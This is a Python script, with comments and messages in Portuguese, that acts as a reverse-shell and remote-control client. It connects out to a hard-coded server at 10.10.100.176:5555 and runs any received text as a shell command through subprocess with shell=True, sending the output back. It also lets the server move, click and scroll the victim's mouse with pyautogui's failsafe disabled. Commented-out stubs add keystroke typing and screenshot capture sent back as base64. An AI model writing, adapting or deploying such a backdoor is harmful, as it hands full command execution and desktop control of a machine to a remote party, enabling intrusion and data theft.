import socket
import subprocess
import pyautogui
import os

pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0.1

def conectar_ao_servidor():
    HOST = '10.10.100.176'   # ← Mudar para o IP real do servidor quando for testar em outra máquina
    PORT = 5555

    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        cliente.connect((HOST, PORT))
        print("Conectado ao servidor com sucesso!")
    except Exception as e:
        print(f"Erro ao conectar: {e}")
        return

    while True:
        try:
            # Recebe comando do servidor
            dados = cliente.recv(8192).decode('utf-8')
            
            if not dados or dados.lower() == 'sair':
                print("Comando de saída recebido. Encerrando...")
                break

            print(f"Comando recebido: {dados}")
            resposta = ""

            if dados.startswith("mouse_move"):
                try:
                    partes = dados.split()
                    x = int(partes[1])
                    y = int(partes[2])
                    pyautogui.moveTo(x, y, duration=0.3)
                    resposta = f"Mouse movido para: ({x}, {y})"
                except Exception as e:
                    resposta = f"Erro ao mover mouse: {e}"

            elif dados == "click":
                pyautogui.click()
                resposta = "Clique esquerdo realizado"

            elif dados == "right_click":
                pyautogui.rightClick()
                resposta = "Clique direito realizado"

            elif dados == "double_click":
                pyautogui.doubleClick()
                resposta = "Duplo clique realizado"

            elif dados.startswith("scroll "):
                try:
                    partes = dados.split()
                    quantidade = int(partes[1])
                    pyautogui.scroll(quantidade)
                    resposta = f"Scroll realizado: {quantidade}"
                except Exception as e:
                    resposta = f"Erro ao realizar scroll: Use: scroll 200 ou scroll -200\nerro:{e}"

            # elif dados.startswith("type "):
            #     texto = dados[5:]
            #     pyautogui.write(texto)
            
            # if dados == "screenshot":
            #     img = ImageGrab.grab()
            #     buffer = io.BytesIO()
            #     img.save(buffer, format="PNG")
            #     img_str = base64.b64encode(buffer.getvalue()).decode()
            #     cliente.send(f"IMG: {img_str}".encode())

            # Executa o comando no sistema
            else:
                try:
                # Executa e captura saída
                    resultado = subprocess.run(
                        dados,
                        shell=True,
                        capture_output=True,
                        text=True,
                        encoding='utf-8', errors='replace'
                    )
                    saida = resultado.stdout + resultado.stderr
                    if not saida.strip():
                        saida = "Comando executado (sem saída visível)"
                    resposta = saida
                except Exception as erro_exec:
                    resposta = f"Erro ao executar comando: {erro_exec}"

            # Envia resultado de volta
            cliente.send(resposta.encode('utf-8'))

        except Exception as e:
            print(f"Erro na comunicação: {e}")
            break

    cliente.close()
    print("Conexão encerrada.")

if __name__ == "__main__":
    conectar_ao_servidor()